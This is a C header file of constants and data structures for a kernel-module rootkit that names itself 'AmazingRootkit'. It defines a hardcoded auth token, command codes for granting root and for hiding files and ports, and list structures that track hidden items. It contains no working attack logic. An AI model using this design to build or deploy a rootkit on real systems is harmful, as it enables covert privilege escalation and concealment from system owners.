#ifndef CONSTANTS_H
#define CONSTANTS_H

// Define constants
#define MODULE_NAME "AmazingRootkit"
#define AUTH_TOKEN 0xabcdef
#define MAX_BUF_SIZE 256
#define TMPSZ 150
#define TCP6_EXTENSION 27

enum {
    ROOT_ME=0,
    ARB_ROOT,
    HIDE_FILE,
    HIDE_PORT,
};

struct s_args
{
    unsigned short cmd;
    void *ptr;
};


#ifdef KERNEL_MODULE
struct hidden_port
{
    unsigned short port;
    struct list_head list;
};

struct hidden_file
{
    char fname[MAX_BUF_SIZE];
    struct list_head list;
};
#endif

#endif // CONSTANTS_H